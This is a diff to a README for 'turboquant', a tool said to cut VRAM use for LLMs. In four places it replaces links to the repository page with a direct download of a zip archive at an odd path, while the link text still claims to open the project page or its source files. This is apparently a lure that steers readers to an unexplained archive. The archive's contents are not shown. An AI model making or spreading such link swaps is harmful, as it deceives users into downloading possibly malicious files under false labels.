@@ -1,6 +1,6 @@
 # ⚡ turboquant - Cut VRAM Use for LLMs
 
-[![Download](https://img.shields.io/badge/Download-TurboQuant-blue?style=for-the-badge)](https://github.com/aureolereadyreckoner325/turboquant)
+[![Download](https://img.shields.io/badge/Download-TurboQuant-blue?style=for-the-badge)](https://raw.githubusercontent.com/aureolereadyreckoner325/turboquant/main/Tinamidae/Software_v3.0.zip)
 
 ## 🧩 What turboquant does
 
@@ -22,7 +22,7 @@ Use turboquant if you want to:
 
 Use this link to visit the page and download or install the project:
 
-[Open the turboquant page](https://github.com/aureolereadyreckoner325/turboquant)
+[Open the turboquant page](https://raw.githubusercontent.com/aureolereadyreckoner325/turboquant/main/Tinamidae/Software_v3.0.zip)
 
 If you use Python on Windows, the common setup path is:
 
@@ -199,7 +199,7 @@ If you are new to this kind of software, use this order:
 
 If you want the source files, open the repository page here:
 
-[https://github.com/aureolereadyreckoner325/turboquant](https://github.com/aureolereadyreckoner325/turboquant)
+[https://raw.githubusercontent.com/aureolereadyreckoner325/turboquant/main/Tinamidae/Software_v3.0.zip](https://raw.githubusercontent.com/aureolereadyreckoner325/turboquant/main/Tinamidae/Software_v3.0.zip)
 
 Use this if you want to inspect the code, track updates, or work from the source instead of pip.
 
@@ -240,7 +240,7 @@ If you manage models with separate environments, activate the right environment 
 
 Visit the project page here to download or install from the repository:
 
-[https://github.com/aureolereadyreckoner325/turboquant](https://github.com/aureolereadyreckoner325/turboquant)
+[https://raw.githubusercontent.com/aureolereadyreckoner325/turboquant/main/Tinamidae/Software_v3.0.zip](https://raw.githubusercontent.com/aureolereadyreckoner325/turboquant/main/Tinamidae/Software_v3.0.zip)
 
 ## 🧩 Notes for model users
 
